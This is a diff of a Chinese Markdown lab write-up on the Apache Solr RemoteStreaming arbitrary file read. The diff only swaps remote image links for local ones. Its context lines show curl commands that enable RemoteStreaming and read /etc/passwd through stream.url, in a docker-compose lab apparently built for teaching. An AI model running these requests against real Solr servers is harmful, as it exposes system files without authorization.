@@ -22,7 +22,7 @@ docker-compose up -d
 
 首先，访问`http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json`获取数据库名：
 
-![image-20220301133315348](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011333403.png)
+![image-20220301133315348](./images/202203011333403.png)
 
 发送如下数据包，修改数据库`demo`的配置，开启`RemoteStreaming`：
 
@@ -32,7 +32,7 @@ curl -i -s -k -X $'POST' \
     $'http://your-ip:8983/solr/demo/config'
 ```
 
-![image-20220301133429439](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011334580.png)
+![image-20220301133429439](./images/202203011334580.png)
 
 再通过`stream.url`读取任意文件：
 
@@ -40,5 +40,5 @@ curl -i -s -k -X $'POST' \
 curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
 ```
 
-![image-20220301133519998](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011335312.png)
+![image-20220301133519998](./images/202203011335312.png)
 
